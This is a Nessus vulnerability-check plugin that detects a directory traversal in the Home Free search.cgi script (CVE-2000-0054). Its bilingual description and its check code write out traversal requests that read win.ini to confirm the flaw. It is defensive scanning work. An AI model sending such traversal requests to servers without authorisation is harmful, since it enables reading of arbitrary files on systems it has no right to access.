#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10101);
 script_bugtraq_id(921);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2000-0054");
 name["english"] = "Home Free search.cgi directory traversal";
 name["francais"] = "Home Free search.cgi directory traversal";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It is possible to read arbitrary files on
the remote server by requesting :

	GET /cgi-bin/search.cgi?letter=\\..\\..\\.....\\file_to_read
	

An attacker may use this flaw to read arbitrary files on
this server.

Solution : remove this CGI from /cgi-bin
Bugtraq ID : 921
Risk factor : High";

 desc["francais"] = "
Il est possible de lire des fichiers
arbitraires sur ce serveur en faisant la
requete :

	GET /cgi-bin/search.cgi?letter=\\..\\..\\.....\\fichier_a_lire
	
Un pirate peut utilser ce problème pour lire
des fichiers arbitraires sur ce système

Solution : retirez search.cgi de /cgi-bin
Id Bugtraq : 921
Facteur de risque : Elevé";
	
 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Attempts GET /cgi-bin/search.cgi?\\..\\..\\file.txt";
 summary["francais"] = "Essayes GET /cgi-bin/search.cgi?\\..\\..\\file.txt";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);


foreach dir (cgi_dirs())
{
req1 = http_get(port:port,
	item:string(dir,"/search.cgi?..\\..\\..\\..\\..\\..\\windows\\win.ini"));

req2 = http_get(port:port,
		item:string(dir,"/search.cgi?..\\..\\..\\..\\..\\..\\winnt\\win.ini"));

r = http_keepalive_send_recv(port:port, data:req1);
if( r == NULL ) exit(0);
if("[windows]" >< r){
 	security_hole(port);
	exit(0);
	}

r = http_keepalive_send_recv(port:port, data:req2);
if( r == NULL ) exit(0);
 if("[fonts]" >< r){
 	security_hole(port);
	exit(0);
	}
}


